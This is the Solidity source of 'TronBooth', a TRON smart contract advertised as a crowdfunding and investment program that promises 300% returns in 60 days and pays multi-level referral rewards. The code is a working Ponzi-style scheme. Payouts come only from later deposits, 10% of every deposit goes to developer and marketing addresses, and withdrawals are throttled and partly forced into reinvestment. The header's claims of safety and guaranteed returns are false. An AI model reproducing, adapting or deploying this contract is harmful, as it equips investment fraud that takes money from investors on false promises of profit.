//SourceUnit: TronBooth.sol

pragma solidity 0.5.8;

/**
* 
*                                                         
*                                                        
* TRON BOOTH THE MOST SAFE AND STILL ATRACTIVE SMARTCONTRACT EVER
* 
* Crowdfunding And Investment Program: 300% ROI in 60 days or less. 
* 15% Referral Rewards 5 Levels
* 5% daily RIO
* Withdraw intantly every 72 hours
* 
* Tronoid 
* https://tronbooth.com
* 
* 
**/
contract TronBooth  {
  using SafeMath for uint;
  
  struct Deposit {
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
    mapping(uint => uint) referrals;
    uint refAt;
    uint balanceRef;
    uint totalRef;
    uint reinvestableBalance;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }
  
  uint constant MIN_DEPOSIT = 100 trx;
  uint constant MAX_WITHDRAWAL = 10000 trx;
  uint constant ADAY = 28800;
  uint INVESTMENT_TERM = ADAY.mul(60); // 60 days
  uint constant CONTRACT_LIMIT = 800; // 20% daily withdraw
  uint constant START_AT = 25978837;

  address payable public Dev;
  address payable internal Marketing;

  uint public  contractBalance;
  uint private contractCheckpoint;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalReinvested;
  uint public totalRefRewards;
  mapping (address => Investor) public investors;
  mapping(address => bool) public lastReinvest;

  
  event DepositAt(address indexed user, uint amount, uint indexed date);
  event Withdraw(address user, uint amount);
  
  modifier onlyCreator() {
		require(msg.sender == Dev, 'You are not the creator');
		_;
	}

  function setMarketing(address payable _Marketing)
	public
	onlyCreator() {
		Marketing = _Marketing;
	}

  function getBalance() public view returns (uint) {
      return address(this).balance;
  }

  function updateBalance() public {
    //only once a day
		require(block.timestamp > contractCheckpoint + 1 days , "Only once a day");
    contractCheckpoint = block.timestamp;
    contractBalance = getBalance();
  }

  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      investors[msg.sender].paidAt = block.number;
      totalInvestors++;
      
      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;
        investors[referer].refAt = block.number;
        
        address rec = referer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }
          investors[rec].referrals[i]++;
          
          rec = investors[rec].referer;
        }
      }
    }
  }
  
  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;
    
    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      
      if(!hasQualifyingRef(rec)) {
        break;
      }

      uint a = amount * refRewards[i] / 1000;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      
      rec = investors[rec].referer;
    }
  }

  function hasQualifyingRef(address _user) internal view returns(bool) {
    return (investors[_user].refAt.add(20 * ADAY) >= block.number);
  }
  
constructor(address payable _Marketing) public {
    Dev = msg.sender;
    Marketing = _Marketing;
    lastReinvest[Dev] = true;

    refRewards.push(50);
    refRewards.push(50);
    refRewards.push(20);
    refRewards.push(20);
    refRewards.push(10);
  }
  
  function deposit(address referer) external payable {
    // require(block.number >= START_AT);
    require(msg.value >= MIN_DEPOSIT, "Invalid amount");
    
    register(referer);
    rewardReferers(msg.value, investors[msg.sender].referer);
    
    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;
    
    investors[msg.sender].deposits.push(Deposit(msg.value, block.number));
    
    Dev.transfer(msg.value.mul(6).div(100));
    Marketing.transfer(msg.value.mul(4).div(100));
    
    emit DepositAt(msg.sender, msg.value, block.timestamp);
  }

  function reinvest() external payable {
    Investor storage investor = investors[msg.sender];
    require(investor.registered, "You must be registered to reinvest");

    // passive & ref earnings
    uint amount = profit();
    require(amount >= MIN_DEPOSIT, "Invalid amount");

    investor.paidAt = block.number;
    investor.balanceRef = 0;

    investors[msg.sender].withdrawn += amount;
    emit Withdraw(msg.sender, amount);

    // reinvest balance
    amount += investor.reinvestableBalance;
    investor.reinvestableBalance = 0;
    totalReinvested += amount;
    
    investors[msg.sender].invested += amount;
    investors[msg.sender].deposits.push(Deposit(amount, block.number));
    
    Dev.transfer(amount.mul(6).div(100));
    Marketing.transfer(amount.mul(4).div(100));
    
    emit DepositAt(msg.sender, amount, block.timestamp);
  }
  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      
      uint finish = dep.at + INVESTMENT_TERM;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * 300 / INVESTMENT_TERM / 100;
      }
    }
    amount += investor.balanceRef;

    uint payout_max = investor.invested.mul(3); // 300%
    if (investor.withdrawn.add(amount) > payout_max) {
      amount = payout_max.sub(investor.withdrawn);
    }
  }

  function referrals(address user) public view returns(uint,uint,uint,uint,uint) {
    Investor storage investor = investors[user];
    return (
      investor.referrals[0],
      investor.referrals[1],
      investor.referrals[2],
      investor.referrals[3],
      investor.referrals[4]
    );
  }
  
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    require((block.number - investor.paidAt) >= ADAY.mul(3), "You can only withdraw once in 72 hours");
    
    uint amount = withdrawable(msg.sender);
    
    investor.balanceRef = 0;
    investor.paidAt = block.number;
    
    require(amount > 0, "Withdrawal limit reached");

    return amount;
  }
  
  function withdraw() external {
    uint amount = profit();

    uint currentBalance = getBalance();
    if(amount >= currentBalance){
      amount = currentBalance;
    }
    require(currentBalance.sub(amount)  >= contractBalance.mul(CONTRACT_LIMIT).div(1000), "80% contract balance limit");
            
    uint _reinvest = amount.mul(40).div(100);
    amount = amount.mul(60).div(100);
    if (amount > MAX_WITHDRAWAL) {
      _reinvest += amount - MAX_WITHDRAWAL;
      amount = MAX_WITHDRAWAL;
    }

    investors[msg.sender].reinvestableBalance += _reinvest;

    if (msg.sender.send(amount)) {
      investors[msg.sender].withdrawn += amount.add(_reinvest);
      require (lastReinvest[msg.sender] == false);
        
      emit Withdraw(msg.sender, amount.add(_reinvest));
    }
  }
}

library SafeMath {

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0);
        uint c = a / b;

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a);
        uint c = a - b;

        return c;
    }

    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a);

        return c;
    }

}